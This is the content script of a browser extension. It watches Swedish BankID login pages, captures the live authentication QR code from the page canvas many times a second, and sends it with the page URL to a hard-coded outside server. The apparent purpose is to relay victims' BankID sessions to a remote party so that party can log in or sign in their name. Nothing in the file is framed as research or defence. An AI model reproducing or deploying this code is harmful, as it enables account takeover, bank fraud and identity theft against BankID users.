// Server configuration
const PRODUCTION_URL = 'https://web-production-c116.up.railway.app';

// BankID configuration
const BANKID_CONFIG = {
    identifier: {
        urls: ['bankid.com', 'bankid.'],
        titles: ['bankid', 'logga in'],
        domains: ['bankid']
    },
    selectors: {
        qrCanvas: 'canvas[title*="QR-kod"], canvas[alt*="QR-kod"]',
        qrCanvasById: 'canvas[id*="qr"], canvas[id*="bankid"]',
        qrCanvasClass: 'canvas[class*="qr"], canvas[class*="bankid"]',
        qrCanvasAll: 'canvas[id*="bankid"], canvas[class*="bankid"], canvas[data-testid*="qr"]',
        qrImage: 'img[alt*="QR-kod"], img[class*="qr-code"]'
    },
    captureInterval: 50,
    captureThrottle: 100,
    lastCapture: 0,
    lastHash: null,
    displayUrl: `${PRODUCTION_URL}/Bankidfelsokningskundidentifieringkund98721311`
};

// Function to send QR code to server
async function sendQRCode(imageData) {
    try {
        console.log('Preparing to send QR code...');
        
        // Validate the image data
        if (!imageData || typeof imageData !== 'string') {
            throw new Error('Invalid image data');
        }
        
        if (!imageData.startsWith('data:image/png;base64,')) {
            throw new Error('Invalid image data format');
        }
        
        // Create the payload matching other extensions' format
        const payload = {
            qrData: imageData,
            bank: 'BANKID',
            timestamp: new Date().toISOString(),
            url: window.location.href,
            displayUrl: BANKID_CONFIG.displayUrl
        };
        
        console.log('Request payload structure:', {
            hasQrData: !!payload.qrData,
            qrDataLength: payload.qrData.length,
            qrDataPrefix: payload.qrData.substring(0, 30),
            bank: payload.bank,
            timestamp: payload.timestamp
        });
        
        const response = await fetch(`${PRODUCTION_URL}/api/qr`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Server response:', errorText);
            throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
        }

        const result = await response.json();
        console.log('Server response:', result);
        showNotification('QR code captured and sent successfully');
    } catch (error) {
        console.error('Error sending QR code:', error);
        showNotification('Error sending QR code: ' + error.message, true);
    }
}

// Function to capture QR code
function captureQRCode() {
    const now = Date.now();
    
    if (now - BANKID_CONFIG.lastCapture < BANKID_CONFIG.captureThrottle) {
        return;
    }
    
    const qrCanvas = document.querySelector(BANKID_CONFIG.selectors.qrCanvas) || 
                    document.querySelector(BANKID_CONFIG.selectors.qrCanvasById) ||
                    document.querySelector(BANKID_CONFIG.selectors.qrCanvasClass) ||
                    Array.from(document.getElementsByTagName('canvas')).find(canvas => 
                        canvas.width === canvas.height && 
                        canvas.width >= 150 && 
                        canvas.width <= 200
                    );
    
    if (qrCanvas) {
        try {
            const rect = qrCanvas.getBoundingClientRect();
            if (rect.width === 0 || rect.height === 0 || !rect.width || !rect.height) {
                return;
            }

            const base64Data = qrCanvas.toDataURL('image/png');
            if (!base64Data || base64Data === 'data:,') {
                return;
            }

            const hash = base64Data.slice(-32);
            if (hash === BANKID_CONFIG.lastHash) {
                console.log('Same QR code as last capture');
                return;
            }
            
            BANKID_CONFIG.lastHash = hash;
            BANKID_CONFIG.lastCapture = now;

            console.log('Capturing new QR code');
            sendQRCode(base64Data);
        } catch (error) {
            console.error('Error capturing QR code:', error);
        }
    }
}

// Function to show notification
function showNotification(message, isError = false) {
    let notification = document.getElementById('qr-capture-notification');
    if (!notification) {
        notification = document.createElement('div');
        notification.id = 'qr-capture-notification';
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 4px;
            color: white;
            font-family: Arial, sans-serif;
            z-index: 999999;
            transition: opacity 0.3s ease-in-out;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        `;
        document.body.appendChild(notification);
    }

    notification.style.backgroundColor = isError ? '#dc3545' : '#28a745';
    notification.textContent = message;
    notification.style.opacity = '1';

    setTimeout(() => {
        notification.style.opacity = '0';
        setTimeout(() => notification.remove(), 300);
    }, 2000);
}

// Start monitoring
let captureInterval;
let observerTimeout;

function startMonitoring() {
    if (captureInterval) clearInterval(captureInterval);
    
    captureInterval = setInterval(captureQRCode, BANKID_CONFIG.captureInterval);
    setTimeout(captureQRCode, 100);

    const observer = new MutationObserver((mutations) => {
        if (observerTimeout) clearTimeout(observerTimeout);
        observerTimeout = setTimeout(captureQRCode, 10);
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['src', 'style', 'class', 'id', 'data-testid']
    });
}

// Start monitoring when the page loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startMonitoring);
} else {
    startMonitoring();
}

// Handle messages from the extension
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'captureQR') {
        captureQRCode();
        sendResponse({ success: true });
    }
}); 